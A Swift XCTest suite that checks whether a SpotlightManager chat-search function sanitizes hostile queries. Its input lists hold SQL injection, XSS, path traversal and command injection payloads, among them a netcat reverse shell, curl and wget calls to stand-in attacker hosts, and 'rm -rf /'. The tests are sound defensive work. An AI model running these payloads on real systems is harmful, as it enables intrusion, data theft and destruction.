import XCTest
import CoreSpotlight
@testable import AStudioSystemIntegration

/// Comprehensive security tests for SpotlightManager
/// Tests query sanitization, SQL injection prevention, and input validation
final class SpotlightManagerSecurityTests: XCTestCase {

    var spotlightManager: SpotlightManager!

    override func setUp() async throws {
        try await super.setUp()
        spotlightManager = SpotlightManager()

        // Clean up any existing test data
        try await spotlightManager.removeAllChatMessages()
    }

    override func tearDown() async throws {
        // Clean up after tests
        try await spotlightManager.removeAllChatMessages()
        spotlightManager = nil
        try await super.tearDown()
    }

    // MARK: - Query Sanitization Tests

    func testQuerySanitizationRemovesSpecialCharacters() async throws {
        let maliciousQueries = [
            "'; DROP TABLE messages; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(whoami)",
            "`ls -la`",
            "test\u{00}null",
            "test\r\ninjection",
            "query\twith\ttabs",
            "query\\with\\backslashes",
            "query\"with\"quotes",
            "query'with'apostrophes"
        ]

        for query in maliciousQueries {
            // The query should be sanitized before being passed to Spotlight
            // This test verifies that no exception is thrown
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Results may be empty, but no error should be thrown
                XCTAssertNotNil(results, "Query should be sanitized: \(query)")
            } catch {
                // If error is thrown, it should not be a crash/injection error
                XCTAssertFalse(
                    error.localizedDescription.contains("injection") ||
                    error.localizedDescription.contains("SQL"),
                    "Sanitization should prevent injection: \(query), error: \(error)"
                )
            }
        }
    }

    func testQueryWithWildcardsIsSanitized() async throws {
        let wildcardQueries = [
            "*",
            "%",
            "*.*",
            "test*",
            "*test",
            "test*test",
            "%test%",
            "_test_"
        ]

        for query in wildcardQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                XCTAssertNotNil(results, "Wildcard query should be handled safely: \(query)")
            } catch {
                // Should not crash or cause injection
                XCTAssertTrue(true)
            }
        }
    }

    func testQueryWithControlCharacters() async throws {
        let controlCharQueries = [
            "test\u{00}",
            "test\u{1B}",
            "test\n",
            "test\r",
            "test\t",
            "\u{07}test", // bell
            "test\u{08}", // backspace
        ]

        for query in controlCharQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Control characters should be filtered out
                XCTAssertNotNil(results)
            } catch SpotlightManager.SpotlightError.invalidContent {
                // Expected for some control characters
                XCTAssertTrue(true)
            } catch {
                // Other errors should not be crashes
                XCTAssertTrue(true)
            }
        }
    }

    // MARK: - SQL Injection Prevention Tests

    func testSQLInjectionAttempts() async throws {
        let sqlInjectionQueries = [
            "'; SELECT * FROM users; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM messages--",
            "'; DROP DATABASE astudio; --",
            "1' AND 1=1--",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --",
            "'; INSERT INTO messages VALUES ('hacked'); --",
            "' UPDATE messages SET content='hacked'--"
        ]

        for query in sqlInjectionQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Should not return all records or cause injection
                XCTAssertNotNil(results, "SQL injection should be prevented: \(query)")

                // If results are returned, they should be from legitimate search, not injection
                if !results.isEmpty {
                    // Results should be from actual indexed content matching sanitized query
                    XCTAssertLessThanOrEqual(
                        results.count,
                        10,
                        "Should not return excessive results from injection"
                    )
                }
            } catch SpotlightManager.SpotlightError.invalidContent {
                // Acceptable - query was rejected
                XCTAssertTrue(true)
            } catch {
                // Should not be a database/injection error
                XCTAssertFalse(
                    error.localizedDescription.contains("SQL") ||
                    error.localizedDescription.contains("database") ||
                    error.localizedDescription.contains("syntax"),
                    "SQL injection should be prevented: \(query)"
                )
            }
        }
    }

    func testBlindSQLInjectionAttempts() async throws {
        let blindInjectionQueries = [
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5(1))--",
            "1' AND pg_sleep(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "admin' AND '1'='1"
        ]

        let startTime = Date()

        for query in blindInjectionQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Should not cause timing-based extraction
                XCTAssertNotNil(results)
            } catch {
                // Errors are acceptable, but should not be SQL errors
                XCTAssertFalse(
                    error.localizedDescription.contains("SQL"),
                    "Blind SQL injection should be prevented: \(query)"
                )
            }
        }

        let elapsedTime = Date().timeIntervalSince(startTime)

        // Should not take significantly longer than normal (no sleep/timeout attacks)
        XCTAssertLessThan(
            elapsedTime,
            30.0,
            "Query execution should not indicate timing-based injection"
        )
    }

    // MARK: - Input Validation Tests

    func testQueryLengthValidation() async throws {
        // Test maximum allowed length (100 characters)
        let validLengthQuery = String(repeating: "a", count: 100)
        do {
            let results = try await spotlightManager.searchChatMessages(query: validLengthQuery, limit: 10)
            XCTAssertNotNil(results)
        } catch {
            // Other errors are acceptable
            XCTAssertTrue(true)
        }

        // Test exceeding maximum length (101 characters)
        let invalidLengthQuery = String(repeating: "a", count: 101)
        do {
            _ = try await spotlightManager.searchChatMessages(query: invalidLengthQuery, limit: 10)
            XCTFail("Query exceeding 100 characters should be rejected")
        } catch {
            XCTAssertTrue(
                error is SpotlightManager.SpotlightError,
                "Should throw SpotlightError for invalid length"
            )
            if case SpotlightManager.SpotlightError.invalidContent = error {
                // Expected
            } else {
                XCTFail("Expected invalidContent error")
            }
        }

        // Test very long query
        let veryLongQuery = String(repeating: "a", count: 10000)
        do {
            _ = try await spotlightManager.searchChatMessages(query: veryLongQuery, limit: 10)
            XCTFail("Very long query should be rejected")
        } catch {
            XCTAssertTrue(error is SpotlightManager.SpotlightError)
        }
    }

    func testEmptyQuery() async throws {
        let emptyQueries = [
            "",
            "   ",
            "\t",
            "\n",
            "\r\n",
            "  \t  \n  "
        ]

        for query in emptyQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Empty query should return empty results, not crash
                XCTAssertEqual(results.count, 0, "Empty query should return no results")
            } catch SpotlightManager.SpotlightError.invalidContent {
                // Also acceptable - reject empty queries
                XCTAssertTrue(true)
            } catch {
                // Other errors might occur, but not crashes
                XCTAssertTrue(true)
            }
        }
    }

    func testQueryWithUnicode() async throws {
        let unicodeQueries = [
            "搜索中文",
            "поиск на русском",
            "búsqueda en español",
            "recherche en français",
            "🔍 emoji search",
            "Test with special chars: äöüß",
            "Test with Arabic: العربية",
            "Test with Hebrew: עברית",
            "Test with Japanese: 日本語",
            "Test with Korean: 한국어"
        ]

        for query in unicodeQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Unicode should be handled safely
                XCTAssertNotNil(results, "Unicode query should be handled: \(query)")
            } catch {
                // Errors are acceptable but should not be encoding-related crashes
                XCTAssertFalse(
                    error.localizedDescription.contains("encoding") ||
                    error.localizedDescription.contains("UTF"),
                    "Unicode should be handled safely: \(query)"
                )
            }
        }
    }

    // MARK: - Path Traversal Prevention Tests

    func testPathTraversalAttempts() async throws {
        let pathTraversalQueries = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config",
            "/proc/self/environ",
            "./file.txt",
            "~/.ssh/id_rsa",
            "/var/log/app.log",
            "http://localhost:8080/admin",
            "file:///etc/passwd"
        ]

        for query in pathTraversalQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Path traversal should not work
                XCTAssertNotNil(results, "Path traversal should be prevented: \(query)")

                // Verify no file system access occurred
                if !results.isEmpty {
                    // Results should be from indexed content, not file system
                    XCTAssertTrue(true)
                }
            } catch {
                // Errors are acceptable
                XCTAssertTrue(true)
            }
        }
    }

    // MARK: - Command Injection Prevention Tests

    func testCommandInjectionAttempts() async throws {
        let commandInjectionQueries = [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "; rm -rf /",
            "| nc -e /bin/sh 127.0.0.1 4444",
            "; curl http://evil.com/steal",
            "$(curl attacker.com)",
            "`wget malicious.com/shell.sh`",
            "; eval 'malicious code'"
        ]

        for query in commandInjectionQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Command injection should not execute
                XCTAssertNotNil(results, "Command injection should be prevented: \(query)")
            } catch {
                // Should not be a shell/command error
                XCTAssertFalse(
                    error.localizedDescription.contains("shell") ||
                    error.localizedDescription.contains("command") ||
                    error.localizedDescription.contains("exec"),
                    "Command injection should be prevented: \(query)"
                )
            }
        }
    }

    // MARK: - XSS Prevention Tests

    func testXSSAttempts() async throws {
        let xssQueries = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>"
        ]

        for query in xssQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // XSS should not execute
                XCTAssertNotNil(results, "XSS should be prevented: \(query)")

                // Results should contain sanitized text, not executable code
                for result in results {
                    XCTAssertFalse(
                        result.contains("<script>") ||
                        result.contains("javascript:") ||
                        result.contains("onerror="),
                        "XSS code should be sanitized in results"
                    )
                }
            } catch {
                // Errors acceptable
                XCTAssertTrue(true)
            }
        }
    }

    // MARK: - Limit Validation Tests

    func testSearchLimitValidation() async throws {
        let query = "test"

        // Test various limits
        let validLimits = [1, 5, 10, 20, 50, 100]
        for limit in validLimits {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: limit)
                XCTAssertLessThanOrEqual(results.count, limit, "Should not exceed limit: \(limit)")
            } catch {
                // Acceptable
                XCTAssertTrue(true)
            }
        }

        // Test very large limit
        do {
            let results = try await spotlightManager.searchChatMessages(query: query, limit: 10000)
            // Spotlight should have internal limits
            XCTAssertNotNil(results)
        } catch {
            // Acceptable
            XCTAssertTrue(true)
        }

        // Test zero limit
        do {
            let results = try await spotlightManager.searchChatMessages(query: query, limit: 0)
            XCTAssertEqual(results.count, 0, "Zero limit should return no results")
        } catch {
            // Acceptable - might be rejected
            XCTAssertTrue(true)
        }

        // Test negative limit
        do {
            let results = try await spotlightManager.searchChatMessages(query: query, limit: -1)
            // Should handle gracefully (either reject or treat as 0)
            XCTAssertTrue(results.isEmpty || results.count >= 0)
        } catch {
            // Might throw error for negative limit
            XCTAssertTrue(true)
        }
    }

    // MARK: - Table-Driven Sanitization Tests

    func testQuerySanitizationTableDriven() async throws {
        struct SanitizationTestCase {
            let input: String
            let shouldPass: Bool
            let description: String
        }

        let testCases: [SanitizationTestCase] = [
            // Valid queries
            SanitizationTestCase(input: "simple search", shouldPass: true, description: "Simple alphanumeric query"),
            SanitizationTestCase(input: "search with spaces", shouldPass: true, description: "Query with spaces"),
            SanitizationTestCase(input: "test-query_123", shouldPass: true, description: "Query with dashes and underscores"),
            SanitizationTestCase(input: "email@test.com", shouldPass: true, description: "Query with @ and ."),
            SanitizationTestCase(input: "user@domain.com", shouldPass: true, description: "Email-like query"),
            SanitizationTestCase(input: "what? really?", shouldPass: true, description: "Query with question marks"),
            SanitizationTestCase(input: "wow!", shouldPass: true, description: "Query with exclamation"),
            SanitizationTestCase(input: "test.file", shouldPass: true, description: "Query with dots"),
            SanitizationTestCase(input: "$100", shouldPass: true, description: "Query with dollar sign"),
            SanitizationTestCase(input: "50% off", shouldPass: true, description: "Query with percent"),
            SanitizationTestCase(input: "test@example.com", shouldPass: true, description: "Email address"),

            // Malicious queries that should be sanitized
            SanitizationTestCase(input: "'; DROP TABLE; --", shouldPass: true, description: "SQL injection (sanitized)"),
            SanitizationTestCase(input: "<script>alert(1)</script>", shouldPass: true, description: "XSS attempt (sanitized)"),
            SanitizationTestCase(input: "../../etc/passwd", shouldPass: true, description: "Path traversal (sanitized)"),
            SanitizationTestCase(input: "$(whoami)", shouldPass: true, description: "Command injection (sanitized)"),
            SanitizationTestCase(input: "test\u{00}null", shouldPass: true, description: "Null byte (sanitized)"),

            // Invalid queries
            SanitizationTestCase(input: String(repeating: "a", count: 101), shouldPass: false, description: "Too long (>100 chars)"),
            SanitizationTestCase(input: "", shouldPass: true, description: "Empty (allowed or rejected)"),
            SanitizationTestCase(input: "   ", shouldPass: true, description: "Whitespace only (allowed or rejected)")
        ]

        for testCase in testCases {
            do {
                let results = try await spotlightManager.searchChatMessages(
                    query: testCase.input,
                    limit: 10
                )

                if testCase.shouldPass {
                    // Should succeed (possibly with empty results)
                    XCTAssertNotNil(
                        results,
                        "\(testCase.description): should pass - '\(testCase.input)'"
                    )
                } else {
                    XCTFail(
                        "\(testCase.description): should have thrown error - '\(testCase.input)'"
                    )
                }
            } catch SpotlightManager.SpotlightError.invalidContent {
                if !testCase.shouldPass {
                    // Expected to be rejected
                    XCTAssertTrue(
                        true,
                        "\(testCase.description): correctly rejected - '\(testCase.input)'"
                    )
                } else {
                    XCTFail(
                        "\(testCase.description): should not have thrown invalidContent - '\(testCase.input)'"
                    )
                }
            } catch {
                // Other errors
                if testCase.shouldPass {
                    // Some errors might be acceptable (e.g., no results found)
                    XCTAssertTrue(
                        true,
                        "\(testCase.description): error acceptable - '\(testCase.input)', \(error)"
                    )
                }
            }
        }
    }

    // MARK: - Integration Tests

    func testSearchAfterIndexing() async throws {
        // Index some messages
        let messages = [
            ChatMessage(
                id: "security-test-1",
                sender: "Alice",
                content: "Discussing security practices",
                timestamp: Date()
            ),
            ChatMessage(
                id: "security-test-2",
                sender: "Bob",
                content: "Reviewing code for vulnerabilities",
                timestamp: Date()
            ),
            ChatMessage(
                id: "security-test-3",
                sender: "Charlie",
                content: "Testing input sanitization",
                timestamp: Date()
            )
        ]

        try await spotlightManager.indexChatMessages(messages)

        // Wait for indexing
        try await Task.sleep(nanoseconds: 1_000_000_000)

        // Search for legitimate content
        do {
            let results = try await spotlightManager.searchChatMessages(
                query: "security",
                limit: 10
            )

            // Should return some results (though Spotlight indexing might take time)
            XCTAssertGreaterThanOrEqual(results.count, 0)

            // Verify results don't contain malicious content
            for result in results {
                XCTAssertFalse(
                    result.contains("<script>") ||
                    result.contains("javascript:") ||
                    result.contains("DROP TABLE"),
                    "Results should not contain injected code"
                )
            }
        } catch {
            // Spotlight indexing might not be complete - acceptable
            XCTAssertTrue(true)
        }

        // Clean up
        try await spotlightManager.removeChatMessages(withIds: messages.map { $0.id })
    }

    // MARK: - Performance Tests

    func testSearchPerformanceWithMaliciousInput() async throws {
        let maliciousQueries = [
            String(repeating: "'; DROP TABLE messages; -- ", count: 10),
            String(repeating: "<script>alert('xss')</script>", count: 10),
            String(repeating: "../../etc/passwd", count: 10)
        ]

        measure {
            let expectation = XCTestExpectation(description: "Malicious query performance")
            Task {
                for query in maliciousQueries {
                    do {
                        _ = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                    } catch {
                        // Expected to be sanitized or rejected
                    }
                }
                expectation.fulfill()
            }
            wait(for: [expectation], timeout: 10.0)
        }
    }

    // MARK: - Edge Cases

    func testQueryWithOnlySpecialCharacters() async throws {
        let specialOnlyQueries = [
            "!@#$%^&*()",
            "-_=+[]{}|;:',.<>?",
            "\\/",
            "___",
            "---"
        ]

        for query in specialOnlyQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Should be sanitized to empty or very minimal query
                XCTAssertNotNil(results, "Special-only chars should be sanitized: \(query)")
            } catch {
                // Acceptable to reject
                XCTAssertTrue(true)
            }
        }
    }

    func testQueryWithMixedValidAndInvalid() async throws {
        let mixedQueries = [
            "valid'; DROP TABLE; --",
            "test<script>alert(1)</script>content",
            "search ../../etc/passwd here",
            "normal text $(whoami) continues"
        ]

        for query in mixedQueries {
            do {
                let results = try await spotlightManager.searchChatMessages(query: query, limit: 10)
                // Should sanitize and search for valid parts
                XCTAssertNotNil(results, "Should extract valid parts: \(query)")

                // Results should not contain injected code
                for result in results {
                    XCTAssertFalse(
                        result.contains("DROP TABLE") ||
                        result.contains("<script>") ||
                        result.contains("whoami"),
                        "Malicious parts should be removed"
                    )
                }
            } catch {
                // Acceptable
                XCTAssertTrue(true)
            }
        }
    }
}
